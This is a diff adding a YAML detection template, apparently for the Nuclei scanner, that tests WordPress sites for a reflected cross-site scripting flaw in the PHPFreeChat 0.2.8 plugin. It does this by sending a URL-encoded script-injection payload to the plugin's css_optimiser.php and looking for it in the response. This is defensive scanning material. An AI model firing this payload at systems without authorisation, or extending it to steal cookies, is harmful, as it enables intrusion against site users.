@@ -1,0 +1,52 @@
+id: wp-phpfreechat-xss
+
+info:
+  name: WordPress PHPFreeChat 0.2.8 - Cross-Site Scripting
+  author: daffainfo
+  severity: high
+  description: WordPress PHPFreeChat 0.2.8 plugin contains a cross-site scripting vulnerability via the url parameter. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+  reference:
+    - https://www.exploit-db.com/exploits/37485
+    - http://web.archive.org/web/20210120061848/https://www.securityfocus.com/bid/54332/info
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
+    cvss-score: 7.2
+    cwe-id: CWE-79
+  metadata:
+    max-request: 2
+  tags: xss,wp-plugin,edb,wordpress
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        internal: true
+        words:
+          - '/wp-content/plugins/phpfreechat/'
+
+  - method: GET
+    path:
+      - '{{BaseURL}}/wp-content/plugins/phpfreechat/lib/csstidy-1.2/css_optimiser.php?url=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "</script><script>alert(document.domain)</script>"
+        part: body
+
+      - type: word
+        part: header
+        words:
+          - text/html
+
+      - type: status
+        status:
+          - 200
+# digest: 490a00463044022024d57b254a43e0952d9863f744a58664031981cadbee2b9040e03499d08d275d02203f0f1b2fb992c0a6bda0ded0e614de642699ec58c3db6730f1a8277481c5ab7e:922c64590222798bb761d5b6d8e72950
